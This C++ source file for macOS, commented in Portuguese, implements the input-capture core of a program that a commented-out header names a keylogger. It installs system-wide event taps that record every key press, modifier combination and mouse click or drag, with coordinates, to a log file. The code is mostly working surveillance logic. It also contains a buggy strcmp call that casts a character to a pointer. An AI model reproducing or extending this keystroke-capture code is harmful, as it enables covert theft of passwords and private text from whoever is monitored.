#include "TXInputListener.h"
#include "TXKeyboard.h"
#include "TXLogger.h"
#include "TXMouse.h"
#include "TXConfig.h"
#include <iostream>

// executa ao criar a thread
void TXInputListener::operator()() {
    TXLogger *logger = TXLogger::instance();

//    const char *header = "[[K] KEYLOGGER INITIALIZED]";
//    logger->writeln(header);

    // Incializa os ouvintes
    initializeKeyboardTracker();
    initializeMouseTracker();

    logger->line();

    CFRunLoopRun();
}


/**
 * Registra o rastreador de eventos para o Teclado.
 * Todas teclas quando pressionadas (down e up)
 */
void TXInputListener::initializeKeyboardTracker() {
    TXLogger *logger = TXLogger::instance();

    // Apenas ouvir os eventos, não modificar
    CGEventTapOptions tapOptions = kCGEventTapOptionListenOnly;

    // Ouvir apenas eventos de declado (quando pressionar uma tecla)
    CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));

    // Registra o evento de teclado
    CFMachPortRef keyboardEventTap = CGEventTapCreate(
            kCGSessionEventTap, kCGHeadInsertEventTap, tapOptions, eventMask, CGKeyboardInputEventCallback, NULL
    );

    // Se existir alguma restrição ao nosso programa por parte do SO, o evento não poderá ser registrado.
    if (!keyboardEventTap) {
        logger->writeln("[[ERROR] Cannot track TXKeyboard events!]");
        logger->writeln("[Tracking TXKeyboard events: NO]");
        exit(1);
    } else {
        logger->writeln("[Tracking TXKeyboard events: YES]");
    }

    // Obtem a referência do loop de execução do programa
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, keyboardEventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(keyboardEventTap, true);
}


/**
 * Registra o rastreador de eventos para TXMouse.
 * Clique com Direito/Esquerdo  e  Arrastar
 */
void TXInputListener::initializeMouseTracker() {
    TXLogger *logger = TXLogger::instance();

    // Apenas ouvir os eventos, não modificar **ainda**
    CGEventTapOptions tapOptions = kCGEventTapOptionListenOnly;

    // Ouvir eventos de mouse, clicar, e clicar e arrastar.
    CGEventMask eventMask = (
            CGEventMaskBit(kCGEventLeftMouseDown) | CGEventMaskBit(kCGEventLeftMouseDragged) |
                    CGEventMaskBit(kCGEventRightMouseDown) | CGEventMaskBit(kCGEventRightMouseDragged) |
                    CGEventMaskBit(kCGMouseEventClickState)
    );

    // Registra o evento de teclado
    CFMachPortRef mouseEventTap = CGEventTapCreate(
            kCGSessionEventTap, kCGHeadInsertEventTap, tapOptions, eventMask, CGMouseClickEventCallback, NULL
    );

    // Se existir alguma restrição ao nosso programa por parte do SO, o evento não poderá ser registrado.
    if (!mouseEventTap) {
        logger->writeln("[[ERROR] Cannot track TXMouse events!]");
        logger->writeln("[Tracking TXMouse events: NO]");
        exit(1);
    } else {
        logger->writeln("[Tracking TXMouse events: YES]");
    }

    // Obtem a referência do loop de execução do programa
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, mouseEventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(mouseEventTap, true);
}


// ------------------------------------------------------------------------------------------------------------------------------- \\
// -----------------------------------------------------------   TECLADO   ------------------------------------------------------- \\
// ------------------------------------------------------------------------------------------------------------------------------- \\

// Indica que um bloco de grupo foi iniciado.
bool MDFGroupInitialized = false;

void loggerMDFKey(TXLogger *logger, const char *parsedKey) {
    logger->write("[m:");
    logger->write(parsedKey);
    logger->write("]");
}

/**
 * Cria o grupo de teclas modificadoras, combinado com teclas normais.
 * Tudo que for pressionado enquanto uma ou mais teclas modificadoras estiverem ativas, é gravado dentro do grupo.
 */
void TXInputListener::CGKeyboardModifierInputEventCallback(CGEventType type, CGEventRef event, const char *parsedKey, int keyCode, TXLogger *logger) {

    CGEventFlags flag = CGEventGetFlags(event);

    // Significa que uma ou mais MDF KEY esta ON HOLD
    if (flag != 256) {

        // Grupo não iniciado
        if (!MDFGroupInitialized) {

            // Bloqueia as quebras de linha \n de writeln
            TXLogger::instance()->blockNewLineOnGroups = 1;

            // Inicia o grupo
            logger->write("[{");

            // Marca a inicialização
            MDFGroupInitialized = true;

            // Grava a tecla MDF que iniciou o grupo
            loggerMDFKey(logger, parsedKey);

        } else {

            // Apenas gravar as proximas teclas MDF  (Nota: Além de teclas MDF, teclas normais são gravadas durante um grupo)
            loggerMDFKey(logger, parsedKey);
        }
    } else {

        // Libera as quebras de linha
        TXLogger::instance()->blockNewLineOnGroups = 0;

        // Grava a ultima tecla MDF
        loggerMDFKey(logger, parsedKey);

        // Fecha o grupo
        logger->writeln("}]");

        // Finaliza o identificador de grupo, para reabrir na proxima combinação MDF
        MDFGroupInitialized = false;
    }

}


/**
 * Registra no arquivo de log a tecla pressionada
 */
CGEventRef TXInputListener::CGKeyboardInputEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    TXLogger *logger = TXLogger::instance();

    // Obtem a tecla pressionada
    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    int64_t isInAutoRepeat = CGEventGetIntegerValueField(event, kCGKeyboardEventAutorepeat);

    const char *parsedKey = TXKeyboard::convertKeyCode(keyCode);
    bool isFnKey = TXKeyboard::isMDFKey(keyCode);

    // Se for uma tecla de função, a variavel [fnKeyActive] começara a ganhar alterações de status
    if (isFnKey) {
        CGKeyboardModifierInputEventCallback(type, event, parsedKey, keyCode, logger);
    } else {
        logger->write("[k:");
        logger->write(isInAutoRepeat);

        // TODO.md K1
        if (strcmp((const char *) parsedKey[0], (const char *) "[")) {
            logger->write("[");
            logger->write(parsedKey);
            logger->write("]");
        } else {
            logger->write(parsedKey);
        }

        logger->writeln("]");
    }

    return event;
}





// ------------------------------------------------------------------------------------------------------------------------------- \\
// ------------------------------------------------------------   MOUSE    ------------------------------------------------------- \\
// ------------------------------------------------------------------------------------------------------------------------------- \\

// Variavel de controle, para saber se o mouse esta sendo arrastado
bool is_dragging = false;
char *clickOnDragStart = (char *) malloc(15);

CGEventRef TXInputListener::CGMouseClickEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    TXLogger *logger = TXLogger::instance();

    // Obtem as cordenadas do mouse
    CGPoint cursor = TXMouse::getCursorPosition();

    // Prepara a string com o nome do botão do mouse que foi usado
    const char *parsedMouseEvent = TXMouse::convertMouseEvent(type);

    // Se estiver CLICANDO e ARRASTANDO o mouse.
    if (type == kCGEventLeftMouseDragged || type == kCGEventRightMouseDragged || type == kCGEventOtherMouseDragged) {

        // Se começou a arrastar o mouse agora, salva as cordenadas iniciais
        if (!is_dragging) {

            strcpy(clickOnDragStart, parsedMouseEvent);

            logger->writeln("");
            logger->write("[d:");
            logger->write((float) cursor.x);
            logger->write("x");
            logger->write((float) cursor.y);

            // Marca a flag = "Ainda esta arrastando"
            is_dragging = true;
        } else {
            logger->write("|");
            logger->write((float) cursor.x);
            logger->write("x");
            logger->write((float) cursor.y);
        }

        // Se estiver apenas CLICANDO com o mouse
    } else {

        // Verifica se estava arrastando o mouse na ultima verificação do evento.
        // Neste ponto, se is_dragging é TRUE, significa que ele PAROU de CLICAR e ARRASTAR o mouse.
        if (is_dragging) {
            logger->write(clickOnDragStart);
            logger->write("]");

            logger->writeln("");

            // Resetamos a variavel de controle do DRAG.
            is_dragging = false;

            // TODO - Corrigir um problema aqui. Quando o mouse esta em DRAG, o final do bloco de registro de DRAG só é fechado no próximo clique do usuário. Podendo assim ter inconsistência em alguns blocos de DRAG, portanto, todo bloco drag, quebra linha no final
        }

        // Obter a quantidade de cliques feitos pelo usuario
        // 1/2/3... => Single/Double/Triple...
        int64_t clickStateCount = CGEventGetIntegerValueField(event, kCGMouseEventClickState);

        logger->write("[c:");
        logger->write((int) clickStateCount);
        logger->write(":");
        logger->write((float) cursor.x);
        logger->write("x");
        logger->write((float) cursor.y);
        logger->write(parsedMouseEvent);

        logger->writeln("]");
    }

    return event;
}





